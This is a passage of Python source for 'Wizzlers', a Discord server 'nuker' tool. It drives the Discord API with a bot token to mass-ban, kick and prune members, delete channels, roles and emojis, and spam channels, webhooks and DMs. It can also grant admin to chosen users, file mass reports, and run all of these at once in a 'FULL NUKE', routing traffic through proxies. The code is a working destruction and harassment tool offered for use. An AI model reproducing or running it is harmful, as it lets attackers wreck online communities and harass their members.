            vanity_code = guild.get('vanity_url_code') or "None"
            creation_date = discord.utils.snowflake_time(int(guild['id'])).strftime("%Y-%m-%d %H:%M:%S")

            info = [
                ("Guild Name", guild.get('name')),
                ("Guild ID", guild.get('id')),
                ("Owner", f"{owner_name} ({owner_id})"),
                ("Created At", creation_date),
                ("Members", guild.get('approximate_member_count', 'N/A')),
                ("Vanity URL", vanity_code),
                ("Total Channels", len(channels)),
                ("Total Roles", len(roles)),
                ("Total Emojis", len(emojis)),
            ]

            mode_start, mode_end = get_mode_colors()
            print(gradient_text("╭" + "─" * 60 + "╮", mode_start, mode_end, bold=True))
            for key, value in info:
                print(gradient_text(f"│ {key:<20} │ {str(value):<35} │", mode_start, mode_end, bold=True))
            print(gradient_text("╰" + "─" * 60 + "╯", mode_start, mode_end, bold=True))

        except Exception as e:
            print(format_log_message("ERROR", f"An error occurred: {e}", 40))


    
    async def execute_nuke_all(self, token: str):
        """Execute nuke all with simultaneous operations in fast loop"""
        print(format_log_message("INFO", "Starting FULL NUKE (simultaneous mode)...", 40))
        
        nuke_config = __config__.get("nuke_all", {})
        
        
        session = await self._get_session()
        channels_resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy())
        roles_resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy())
        channels = await channels_resp.json() if channels_resp.status == 200 else []
        roles = await roles_resp.json() if roles_resp.status == 200 else []
        
        
        tasks = []
        
        if nuke_config.get("ban_members", True):
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                for member in members:
                    tasks.append(self.execute_ban(member, token))
            except FileNotFoundError:
                pass
        
        if nuke_config.get("delete_channels", True):
            for ch in channels:
                tasks.append(self.execute_delchannels(ch['id'], token))
        
        if nuke_config.get("delete_roles", True):
            for role in roles:
                if role['id'] != self.guildid:
                    tasks.append(self.execute_delroles(role['id'], token))
        
        if nuke_config.get("delete_emojis", True):
            tasks.append(self.execute_delemojis_all(token))
        
        if nuke_config.get("change_guild_name", True):
            guild_name = __config__.get("operations", {}).get("guild_name", "wizzed By wizzlers")
            tasks.append(self.execute_change_guild_info(token, new_name=guild_name, new_desc=""))
        
        
        batch_size = __max_concurrent__
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i + batch_size]
            await asyncio.gather(*batch, return_exceptions=True)
        
        
        if nuke_config.get("create_roles", True):
            print(format_log_message("INFO", "Creating new roles...", 45))
            for _ in range(25):
                await self.execute_creroles(random.choice(__config__["nuke"]["roles_name"]), token)
        
        if nuke_config.get("create_channels", True):
            print(format_log_message("INFO", "Creating new channels...", 45))
            for _ in range(50):
                await self.execute_crechannels(random.choice(__config__["nuke"]["channel_names"]), 0, token)
        
        if nuke_config.get("spam_webhooks", True):
            await self.execute_webhook_spam(token)
        
        if nuke_config.get("prune_members", True):
            await self.execute_prune(7, token)
        
        print(format_log_message("SUCCESS", "FULL NUKE COMPLETE!", 45))
        return True

    
    async def execute_delchannels_all(self, token: str):
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                channels = await resp.json() if resp.status == 200 else []
        for ch in channels:
            await self.execute_delchannels(ch['id'], token)

    
    async def execute_delroles_all(self, token: str):
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                roles = await resp.json() if resp.status == 200 else []
        
        total_deleted = 0
        for role in roles:
            if role['id'] != self.guildid:
                
                await add_jitter_delay(1.0, 1.5)
                success = await self.execute_delroles(role['id'], token)
                if success:
                    total_deleted += 1
        
        print(format_log_message("SUCCESS", f"Deleted {total_deleted}/{len(roles)} roles", 45))

    
    async def execute_delemojis_all(self, token: str):
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                emojis = await resp.json() if resp.status == 200 else []
        for emoji in emojis:
            await self.execute_delemojis(emoji['id'], token)


    async def execute_get_invite(self, token: str):
        platform = await self.async_input(format_log_message("INFO", "Platform: [w]indows/[m]obile", 50))
        platform = platform.strip().lower()
        
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
            channels = await resp.json()
            if not channels:
                return None
            ch_id = channels[0]['id']
        async with session.post(
            f"https://discord.com/api/v10/channels/{ch_id}/invites",
            headers={"Authorization": f"Bot {token}"}, json={"max_age": 0}, proxy=self._get_proxy()
            ) as resp:
                if resp.status == 200:
                    invite = await resp.json()
                    link = f"https://discord.gg/{invite['code']}"
                    
                    if platform == 'w' or platform == 'windows':
                        pyperclip.copy(link)
                        print(format_log_message("SUCCESS", f"Invite copied to clipboard: {link}", 50))
                    elif platform == 'm' or platform == 'mobile':
                        print(format_log_message("SUCCESS", f"Invite link (mobile): {link}", 50))
                    else:
                        
                        try:
                            pyperclip.copy(link)
                            print(format_log_message("SUCCESS", f"Invite copied: {link}", 50))
                        except:
                            print(format_log_message("SUCCESS", f"Invite link: {link}", 50))
                    return link
        return None

    async def menu(self): 
        os.system("cls") if os.name == "nt" else os.system("clear")
        if os.name == "nt":
            os.system(f"title Nuker | Max Concurrent: {__max_concurrent__} | Config: {__current_config_name__}")
        
        if __mode__ == "deadlizer":
            deadlizer_banner = """
██████╗ ███████╗ █████╗ ██████╗ ██╗     ██╗███████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔══██╗██╔══██╗██║     ██║╚══███╔╝██╔════╝██╔══██╗
██║  ██║█████╗  ███████║██║  ██║██║     ██║  ███╔╝ █████╗  ██████╔╝
██║  ██║██╔══╝  ██╔══██║██║  ██║██║     ██║ ███╔╝  ██╔══╝  ██╔══██╗
██████╔╝███████╗██║  ██║██████╔╝███████╗██║███████╗███████╗██║  ██║
╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
""".rstrip('\n').split('\n')
            new_banner = '\n'.join(gradient_text(line.center(console_width), DEADLIZER_START, DEADLIZER_END, bold=True) for line in deadlizer_banner)
            mode_start, mode_end = DEADLIZER_START, DEADLIZER_END
        else:
            wizzler_banner = """
██╗    ██╗██╗███████╗███████╗██╗     ███████╗██████╗ 
██║    ██║██║╚══███╔╝╚══███╔╝██║     ██╔════╝██╔══██╗
██║ █╗ ██║██║  ███╔╝   ███╔╝ ██║     █████╗  ██████╔╝
██║███╗██║██║ ███╔╝   ███╔╝  ██║     ██╔══╝  ██╔══██╗
╚███╔███╔╝██║███████╗███████╗███████╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
""".rstrip('\n').split('\n')
            new_banner = '\n'.join(gradient_text(line.center(console_width), WIZZLER_START, WIZZLER_END, bold=True) for line in wizzler_banner)
            mode_start, mode_end = WIZZLER_START, WIZZLER_END

        options = """
<Made By Shakti{shakticrown}>
╭───────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│                                               WIZZLERS OP                                                 │
├───────────────────────────────────┬───────────────────────────────────┬───────────────────────────────────┤
│ <01> Ban Members                  │ <12> Nick All                     │ <23> DM All Members               │
│ <02> Kick Members                 │ <13> Change guild Icon            │ <24> Unban All Members            │
│ <03> Prune Members                │ <14> Change Guild Name/description│ <25> Strip All Role Perms         │
│ <04> Create Channels              │ <15> Give Admin                   │ <26> Auto Admin (Select Users)    │
│ <05> Create Roles                 │ <16> Delete Invites               │ <27> Mass Report                  │
│ <06> Delete Channels              │ <17> Switch Guild                 │ <28> Rename Emojis                │
│ <07> Delete Roles                 │ <18> Timeout All                  │ <29> Unick All Users              │
│ <08> Delete Emojis                │ <19> Rename All Channels          │ <30> Server Clone                 │
│ <09> Spam Channels                │ <20> Rename All Roles             │ <31> Nuke All                     │
│ <10> Check Updates                │ <21> Webhook Spam                 │ <32> Get Invite Link (auto-copy)  │
│ <11> Credits                      │ <22> Pause Invites                │ <33> Mode: Wizzler/Deadlizer      │
├───────────────────────────────────┴───────────────────────────────────┴───────────────────────────────────┤
│ <34> Whitelist Add Member         │ <35> Whitelist Remove Member      │ <36> View Whitelist               │
│ <37> Switch Config                │ <38> List Loaded Configs          │ <39> Exit                         │
╰───────────────────────────────────────────────────────────────────────────────────────────────────────────╯
                                          <40> Guild Info                                          
                                <41> Get Bot Invite Link                                 
"""
        options = '\n'.join(gradient_text(line.center(console_width), mode_start, mode_end, bold=True) for line in options.split('\n'))
        
        print(new_banner)
        print(gradient_text("   Wizzlers On Top".center(console_width), mode_start, mode_end, bold=True))
        print(gradient_text(f"     LOADED PROXIES: <{self.proxy_count}>".center(console_width), mode_start, mode_end, bold=True))
        print(gradient_text(f"     ACTIVE CONFIG: [{__current_config_name__}] | Total Configs: {len(__loaded_configs__)}".center(console_width), mode_start, mode_end, bold=True))
        print(gradient_text("    Join discord.gg/wizzlers".center(console_width), mode_start, mode_end, bold=True))
        print(options)
        ans = await self.async_input(format_log_message("INFO", "Select Option (press d+enter to switch modes)", 50))
        
        if ans == "MODE_SWITCHED":
            await asyncio.sleep(1)
            await self.menu()
            return
            
        ans = ans.strip()

        if ans in ["1", "01"]:
            scrape = await self.async_input(format_log_message("INFO", "Fetch member IDs? [Y/N]", 50))
            scrape = scrape.strip().lower()
            if scrape == "y":
                try:
                    os.makedirs("fetched", exist_ok=True)
                    guild = __client__.get_guild(int(self.guildid))
                    if guild:
                        with open("fetched/members.txt", "w") as f:
                            for member in guild.members:
                                f.write(f"{member.id}\n")
                        print(format_log_message("SUCCESS", f"Fetched {len(guild.members)} members", 38))
                    else:
                        print(format_log_message("ERROR", "Guild not found!", 47))
                        await self.menu()
                        return
                except Exception as e:
                    print(format_log_message("ERROR", f"Error fetching members | {e}", 41))
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            self.banned.clear()
            start_time = time.time()
            tasks = [self.execute_ban(member, token) for member in members]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Banned {len(self.banned)}/{len(members)} members in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["2", "02"]:
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            self.kicked.clear()
            start_time = time.time()
            tasks = [self.execute_kick(member, token) for member in members]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Kicked {len(self.kicked)}/{len(members)} members in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["3", "03"]:
            try:
                days_input = await self.async_input(format_log_message("INFO", "Prune days (0-7)", 50))
                days = int(days_input.strip())
                if 0 <= days <= 7:
                    start_time = time.time()
                    pruned_count = await self.execute_prune(days, token)
                    end_time = time.time()
                    duration = end_time - start_time
                    if pruned_count > 0:
                        print(format_log_message("SUCCESS", f"Pruned {pruned_count} members in ({duration:.2f}s)", 43))
                else:
                    print(format_log_message("ERROR", f"Days must be 0-7: {gradient_text(days_input, PINK_START, PINK_END, bold=True)}!", 46))
            except ValueError:
                print(format_log_message("ERROR", f"Invalid number: {gradient_text(days_input, PINK_START, PINK_END, bold=True)}!", 48))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["4", "04"]:
            type_input = await self.async_input(format_log_message("INFO", "Channel type ['t'ext/'v'oice]", 50))
            type_ = 2 if type_input.strip().lower() == 'v' else 0
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return

            self.channels.clear()
            start_time = time.time()
            tasks = [self.execute_crechannels(random.choice(__config__["nuke"]["channel_names"]), type_, token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Created {len(self.channels)}/{amount} channels in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["5", "05"]:
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return

            self.roles.clear()
            start_time = time.time()
            tasks = [self.execute_creroles(random.choice(__config__["nuke"]["roles_name"]), token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Created {len(self.roles)}/{amount} roles in ({duration:.2f}s)", 40))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["6", "06"]:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                channels = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch channels", 39))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching channels | {e}", 39))
                await self.menu()
                return

            if not channels:
                print(format_log_message("ERROR", "No channels found!", 44))
                await self.menu()
                return

            self.channels.clear()
            start_time = time.time()
            tasks = [self.execute_delchannels(ch['id'], token) for ch in channels]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Deleted {len(self.channels)}/{len(channels)} channels in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["7", "07"]:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                roles = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch roles", 42))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching roles | {e}", 42))
                await self.menu()
                return

            if not roles:
                print(format_log_message("ERROR", "No roles found!", 47))
                await self.menu()
                return

            self.roles.clear()
            start_time = time.time()
            
            roles_to_delete = [role['id'] for role in roles if role['id'] != self.guildid]
            total_to_delete = len(roles_to_delete)
            
            tasks = [self.execute_delroles(role_id, token) for role_id in roles_to_delete]
            results = await asyncio.gather(*tasks)
            
            end_time = time.time()
            duration = end_time - start_time
            deleted_count = sum(1 for r in results if r is True)
            print(format_log_message("SUCCESS", f"Deleted {deleted_count}/{total_to_delete} roles in ({duration:.2f}s)", 40))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["8", "08"]:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                emojis = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch emojis", 41))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching emojis | {e}", 41))
                await self.menu()
                return

            if not emojis:
                print(format_log_message("ERROR", "No emojis found!", 46))
                await self.menu()
                return

            self.emojis.clear()
            start_time = time.time()
            tasks = [self.execute_delemojis(emoji['id'], token) for emoji in emojis]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Deleted {len(self.emojis)}/{len(emojis)} emojis in ({duration:.2f}s)", 37))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["9", "09"]:
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Spam amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return

            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                channels = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch channels", 39))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching channels | {e}", 39))
                await self.menu()
                return

            if not channels:
                print(format_log_message("ERROR", "No channels found!", 44))
                await self.menu()
                return

            self.messages.clear()
            self.channels = [ch['id'] for ch in channels if ch['type'] == 0]
            if not self.channels:
                print(format_log_message("ERROR", "No text channels found for spam!", 32))
                await self.menu()
                return

            channel_cycle = cycle(self.channels)
            start_time = time.time()
            tasks = [self.execute_massping(next(channel_cycle), random.choice(__config__["nuke"]["messages_content"]), token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Spammed {len(self.messages)}/{amount} messages in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "10":
            start_time = time.time()
            try:
                session = await self._get_session()
                async with session.get("https://www.youtube.com/@hatedshakti", proxy=self._get_proxy()) as response:
                    is_success = False
                    if response.status == 200:
                        location = response.headers.get('location', '')
                        if '/tag/v' in location:
                            check_version = location.split('/tag/v')[1].split('-')[0]
                            if VERSION != check_version:
                                print(format_log_message("INFO", f"checking the wizzler v{check_version}", 35))
                                webbrowser.open(f"https://www.youtube.com/@hatedshakti")
                            else:
                                print(format_log_message("SUCCESS", f"Up to date: v{VERSION}", 45))
                                is_success = True
                        else:
                            print(format_log_message("ERROR", "Could not parse version", 40))
                    else:
                        print(format_log_message("ERROR", "Could not reach GitHub", 41))
                    
                    end_time = time.time()
                    duration = end_time - start_time
                    if is_success:
                        print(format_log_message("SUCCESS", f"Check update completed in ({duration:.2f}s)", 38))
                    else:
                        print(format_log_message("INFO", f"Check update process finished in ({duration:.2f}s)", 36))

            except Exception as e:
                print(format_log_message("ERROR", f"Check update error | {e}", 45))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "11":
            credits = f"""
{format_log_message("INFO", "Credits:", 48)}
- MADE BY SHAKTI.
- Join Discord server 
 • https://discord.gg/M45m45MaHY
 • https://discord.gg/wizzlers
- Press Enter to return.
            """
            print(credits)
            await self.async_input("")
            await self.menu()

        elif ans == "12":
            new_nick = await self.async_input(format_log_message("INFO", "New nickname", 50))
            new_nick = new_nick.strip()
            if not new_nick:
                print(format_log_message("ERROR", "Nickname cannot be empty!", 37))
                await self.menu()
                return
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            start_time = time.time()
            tasks = [self.execute_nick_all(member, new_nick, token) for member in members]
            results = await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            success_count = sum(1 for r in results if r is True)
            print(format_log_message("SUCCESS", f"Attempted to nick {len(members)} members, succeeded {success_count} in ({duration:.2f}s)", 35))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "13":
            start_time = time.time()
            success = await self.execute_change_icon(token)
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Change icon completed in ({duration:.2f}s)", 38))
            else:
                print(format_log_message("INFO", f"Change icon process finished in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "14":
            start_time = time.time()
            success = await self.execute_change_guild_info(token)
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Change guild info completed in ({duration:.2f}s)", 35))
            else:
                print(format_log_message("INFO", f"Change guild info process finished in ({duration:.2f}s)", 33))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "15":
            success_count, duration = await self.execute_give_admin(token)
            if duration > 0:
                print(format_log_message("SUCCESS", f"Assigned admin to {success_count} users in ({duration:.2f}s)", 36))
            else:
                print(format_log_message("INFO", f"Assign admin process finished in ({duration:.2f}s)", 34))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "16":
            deleted_count, duration, total_invites = await self.execute_delete_invites(token)
            if duration > 0 or total_invites > 0:
                print(format_log_message("SUCCESS", f"Deleted {deleted_count}/{total_invites} invites in ({duration:.2f}s)", 44))
            else:
                print(format_log_message("INFO", f"Delete invites process finished in ({duration:.2f}s)", 42))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "17":
            print(format_log_message("INFO", "Switching guild...", 45))
            guildid = await self.async_input(format_log_message("INFO", "Enter new Guild ID", 50))
            guildid = guildid.strip()
            os.system("cls") if os.name == "nt" else os.system("clear")
            await shakti(guildid, self.client).menu()
            os._exit(0)

        elif ans == "18":
            print(format_log_message("INFO", "Select Timeout Duration:", 50))
            print(gradient_text("╭" + "─" * 60 + "╮", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [1] 1 Day                                                  │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [2] 1 Week                                                 │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [3] 28 Days (Max)                                          │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 60 + "╯", PINK_START, PINK_END, bold=True))
            
            duration_choice = await self.async_input(format_log_message("INFO", "Choose duration (1-3)", 50))
            duration_map = {
                "1": 86400,    
                "2": 604800,   
                "3": 2419200   
            }
            
            duration_seconds = duration_map.get(duration_choice.strip())
            
            if not duration_seconds:
                print(format_log_message("ERROR", f"Invalid choice: {gradient_text(duration_choice, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return
            
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return

            start_time = time.time()
            tasks = [self.execute_timeout_all(member, duration_seconds, token) for member in members]
            results = await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            success_count = sum(1 for r in results if r is True)
            print(format_log_message("SUCCESS", f"Attempted to timeout {len(members)} members, succeeded {success_count} in ({duration:.2f}s)", 35))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "19":
            count = await self.execute_rename_channels(token)
            print(format_log_message("SUCCESS", f"Renamed {count} channels", 40))
        elif ans == "20":
            count = await self.execute_rename_roles(token)
            print(format_log_message("SUCCESS", f"Renamed {count} roles", 40))
        elif ans == "21":
            count = await self.execute_webhook_spam(token)
            print(format_log_message("SUCCESS", f"Sent {count} webhook messages", 40))
        elif ans == "22":
            deleted, duration, total = await self.execute_pause_invites(token)
            print(format_log_message("SUCCESS", f"Paused {deleted}/{total} invites", 40))
        elif ans == "23":
            count = await self.execute_dm_all(token)
            print(format_log_message("SUCCESS", f"DM'd {count} members", 40))
        elif ans == "24":
            count = await self.execute_unban_all(token)
            print(format_log_message("SUCCESS", f"Unbanned {count} users", 40))
        elif ans == "25":
            count = await self.execute_strip_perms(token)
            print(format_log_message("SUCCESS", f"Stripped perms from {count} roles", 40))
        elif ans == "26":
            user_ids_input = await self.async_input(format_log_message("INFO", "User IDs for admin (comma-separated)", 50))
            user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip()]
            if user_ids:
                success_count = 0
                for user_id in user_ids:
                    success = await self.execute_auto_admin(token, user_id)
                    if success:
                        success_count += 1
                print(format_log_message("SUCCESS", f"Admin granted to {success_count}/{len(user_ids)} users", 40))
            else:
                print(format_log_message("ERROR", "No user IDs provided", 40))
        elif ans == "27":
            start_time = time.time()
            success = await self.execute_mass_report()
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Mass Report completed in ({duration:.2f}s)", 35))
            else:
                print(format_log_message("INFO", f"Mass Report process finished in ({duration:.2f}s)", 33))
        elif ans == "28":
            count = await self.execute_rename_emojis(token)
            print(format_log_message("SUCCESS", f"Renamed {count} emojis", 40))
        elif ans == "29":
            count = await self.execute_unick_all(token)
            print(format_log_message("SUCCESS", f"Removed nick from {count} users", 40))
        elif ans == "30":
            await self.execute_clone_server(token)
            print(format_log_message("SUCCESS", "Server cloned!", 40))
        elif ans == "31":
            await self.execute_nuke_all(token)
            print(format_log_message("SUCCESS", "FULL NUKE COMPLETE", 40))
        elif ans == "32":
            await self.execute_get_invite(token)
        elif ans == "33":
            if __mode__ == "wizzler":
                switch_to_deadlizer()
            else:
                switch_to_wizzler()
            await asyncio.sleep(1)
            await self.menu()
        elif ans == "34":
            user_ids_input = await self.async_input(format_log_message("INFO", "User IDs to whitelist (comma-separated)", 50))
            user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip()]
            if user_ids:
                print(format_log_message("SUCCESS", f"Adding {len(user_ids)} user(s) to whitelist...", 45))
                for user_id in user_ids:
                    result = await self.add_to_whitelist(user_id)
                    if result:
                        print(format_log_message("SUCCESS", f"Added user #{user_id} to whitelist", 48))
            else:
                print(format_log_message("ERROR", "No valid user IDs provided", 50))
            await asyncio.sleep(3)
            await self.menu()
        
        elif ans == "35":
            user_ids_input = await self.async_input(format_log_message("INFO", "User IDs to unwhitelist (comma-separated)", 50))
            user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip()]
            if user_ids:
                print(format_log_message("SUCCESS", f"Removing {len(user_ids)} user(s) from whitelist...", 45))
                for user_id in user_ids:
                    result = await self.remove_from_whitelist(user_id)
                    if result:
                        print(format_log_message("SUCCESS", f"Removed user #{user_id} from whitelist", 48))
            else:
                print(format_log_message("ERROR", "No valid user IDs provided", 50))
            await asyncio.sleep(3)
            await self.menu()
                
        elif ans == "36":
            
            print(format_log_message("INFO", f"Whitelisted Members ({len(self.whitelist)}):", 50))
            if not self.whitelist:
                print(gradient_text("  None", PINK_START, PINK_END, bold=True))
                await asyncio.sleep(3)
                await self.menu()
                return

            whitelisted_users = []
            
            async def fetch_user_info(user_id):
                try:
                    
                    user = await self.client.fetch_user(int(user_id))
                    return f"{user.name}#{user.discriminator:<4} (ID: {user.id})"
                except discord.NotFound:
                    return f"User Not Found (ID: {user_id})"
                except Exception:
                    return f"Error Fetching User (ID: {user_id})"

            tasks = [fetch_user_info(user_id) for user_id in sorted(list(self.whitelist))]
            user_info_list = await asyncio.gather(*tasks)
            
            
            max_len = max(len(info) for info in user_info_list)
            header_len = max(max_len + 4, 70)
            print(gradient_text("╭" + "─" * header_len + "╮", PINK_START, PINK_END, bold=True))
            for info in user_info_list:
                
                print(gradient_text(f"│ {info:<{header_len - 4}}   │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * header_len + "╯", PINK_START, PINK_END, bold=True))
            
            await asyncio.sleep(5)
            await self.menu()
            
        elif ans == "37":
            
            if len(__loaded_configs__) < 2:
                print(format_log_message("ERROR", "Only one config loaded. Load multiple configs at startup.", 32))
                await asyncio.sleep(3)
                await self.menu()
                return
            
            print(format_log_message("INFO", "Available Configs to Switch:", 50))
            print(gradient_text("╭" + "─" * 70 + "╮", PINK_START, PINK_END, bold=True))
            config_names = list(__loaded_configs__.keys())
            for i, config_name in enumerate(config_names, 1):
                marker = "✓ ACTIVE" if config_name == __current_config_name__ else "         "
                bot_info = __loaded_configs__[config_name].get("token", "N/A")[:15] + "..."
                print(gradient_text(f"│{i:<2}│ {config_name:<30} {marker} │ {bot_info:<20} │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 80 + "╯", PINK_START, PINK_END, bold=True))
            
            try:
                choice = int(await self.async_input(format_log_message("INFO", "Choose config number", 50)).strip()) - 1
                if 0 <= choice < len(config_names):
                    selected_config = config_names[choice]
                    if switch_config(selected_config):
                        print(format_log_message("SUCCESS", f"Switched to {gradient_text(selected_config, GREEN_START, GREEN_END, bold=True)}", 45))
                        
                        print(format_log_message("INFO", "Note: Restart required for new bot token to take effect", 30))
                    else:
                        print(format_log_message("ERROR", "Failed to switch config", 48))
                else:
                    print(format_log_message("ERROR", "Invalid choice!", 49))
            except ValueError:
                print(format_log_message("ERROR", "Invalid input! Please enter a number.", 33))
            await asyncio.sleep(3)
            await self.menu()
            
        elif ans == "38":
            
            print(format_log_message("INFO", f"Loaded Configs ({len(__loaded_configs__)}):", 50))
            print(gradient_text("╭" + "─" * 105 + "╮", PINK_START, PINK_END, bold=True))
            for config_name, config_data in __loaded_configs__.items():
                marker = "● ACTIVE" if config_name == __current_config_name__ else "  inactive"
